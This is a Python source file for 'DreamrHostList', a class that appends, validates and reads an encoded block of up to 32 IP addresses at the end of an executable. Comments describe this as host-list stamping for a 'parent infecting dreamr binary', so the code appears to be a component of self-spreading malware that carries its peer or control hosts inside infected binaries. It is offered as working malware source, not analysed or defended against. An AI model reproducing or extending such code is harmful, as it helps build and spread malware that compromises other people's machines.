import socket
import json
import string
import struct
from core import *

# Example binary stamping using a new technique

# Used to extract a list of IP addresses from the parent infecting dreamr binary
class DreamrHostList():
	binaryName = ""
	startup = True
	path = ""

	# Constructor
	def __init__(self, path, binaryName):
		self.binaryName = binaryName
		self.path = path

		# check file size
		try:
			os.chdir(self.path)
			handle = open(self.binaryName, "rb")
			if (handle):
				handle.seek(0, 2)
				if (handle.tell() < 256):
					self.startup = False
			else:
				self.startup = False
		except Exception as e:
			print("hostlist startup 421 -> %s" % str(e))
			self.startup = False

	def isGood(self):
		return self.startup

	def loadHostList(self):
		result = []
		try:
			os.chdir(self.path)
			with open(self.binaryName, "rb") as handle:
				handle.seek(-128, 2)
				unknownBlock = handle.read(128)
				if (self.validateHostBlock(unknownBlock)):
					return self.decodeHostBlock(unknownBlock)
				else:
					return []
		except Exception as e:
			debug("hostlist", "load encoded hostlist fail -> %s" % str(e))
			return []
		return result

	# Tag or re-tag the binary with IPs
	def saveHostList(self, hostlist):
		# if load spits back default, there wasn't anything to read, so write a new one
		try:
			os.chdir(self.path)
			with open(self.binaryName, "rb") as handle:
				handle.seek(-128, 2)
				unknownBlock = handle.read(128)
			os.chdir(self.path)
			with open(self.binaryName, "r+b") as handle:
				if (self.validateHostBlock(unknownBlock)):
					handle.seek(-128, 2)
				else:
					handle.seek(0, 2)
				handle.write(self.encodeHostBlock(hostlist))
				debug("hostlist", "saved")
				return True
		except Exception as e:
			debug("hostlist", "Failed to save hostlist to binary -> " + str(e))
			return False
		return True

	# Validate the actual bytes because I'm not unpacking shit
	def validateHostBlock(self, block):
		if (len(block) != 128): return False
		if (block[0] != '\x7f'): return False # 127
		if (block[1] != '\x00'): return False # 0
		if (block[2] != '\x00'): return False # 0
		if (block[3] != '\x01'): return False # 1
		print("valid host block")
		return True

	# Takes a list of up to 32 IP addresses and turns them into a 128 byte (binary/network ready) block
	# 128 byte
	def encodeHostBlock(self, hostlist):
		result = ""
		try:
			i = 0
			while (i < 32):
				if (i == 0 or i > len(hostlist)):
					address = "127.0.0.1"
				else:
					address = hostlist[i-1]
				a,b,c,d = map(string.atoi, string.split(address, '.'))
				result += struct.pack("BBBB", a, b, c, d)
				i += 1
		except Exception as e:
			pass
		return result

	# Take a 128 byte host block and turns it back into an array
	def decodeHostBlock(self, block):
		result = []
		addr = b""
		# Every 4 bytes is an addr
		for c in block:
			addr += c
			if (len(addr) == 4):
				parts = map(str, struct.unpack('BBBB', addr))
				result.append(string.join(parts, '.'))
				addr = b""
		return result

